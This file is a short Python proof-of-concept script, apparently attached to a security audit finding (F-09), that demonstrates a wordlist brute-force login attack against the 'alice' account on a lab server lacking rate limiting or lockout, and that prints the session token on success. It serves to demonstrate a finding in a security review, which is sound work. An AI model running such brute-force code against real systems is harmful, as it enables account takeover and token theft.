#!/usr/bin/env python3
"""
supplement_F09.py - Credential Brute Force from Malicious Client
Finding: F-09
Violated: R10
Run directly in the MITM or client shell. No rate-limiting or lockout
exists on the server, so an attacker can enumerate passwords freely.
This script attempts a wordlist attack against the 'alice' account.
"""

import socket
import json

SERVER_HOST = "10.0.0.3"   # Connect directly to server (or via MITM IP)
SERVER_PORT = 9000
TARGET_USER = "alice"

# Short demonstration wordlist
WORDLIST = [
    "123456", "password", "letmein", "qwerty", "abc123",
    "admin", "welcome", "monkey", "dragon", "master",
    "password123",   # actual password — demonstrates success
    "sunshine", "princess", "iloveyou"
]


def try_login(username, password):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((SERVER_HOST, SERVER_PORT))
        req = json.dumps({"action": "AUTH", "username": username, "password": password}) + "\n"
        s.sendall(req.encode("utf-8"))
        buf = b""
        while b"\n" not in buf:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
        line, _ = buf.split(b"\n", 1)
        resp = json.loads(line.decode("utf-8"))
        s.close()
        return resp
    except Exception as e:
        return {"status": "error", "message": str(e)}


def main():
    print(f"[F-09] Brute force against '{TARGET_USER}' — {len(WORDLIST)} attempts\n")
    for password in WORDLIST:
        resp = try_login(TARGET_USER, password)
        if resp.get("status") == "ok":
            print(f"[F-09 SUCCESS] password='{password}'  token={resp.get('token')}")
            break
        else:
            print(f"[F-09] FAIL  password='{password}'")
    else:
        print("[F-09] Wordlist exhausted — password not found")


if __name__ == "__main__":
    main()
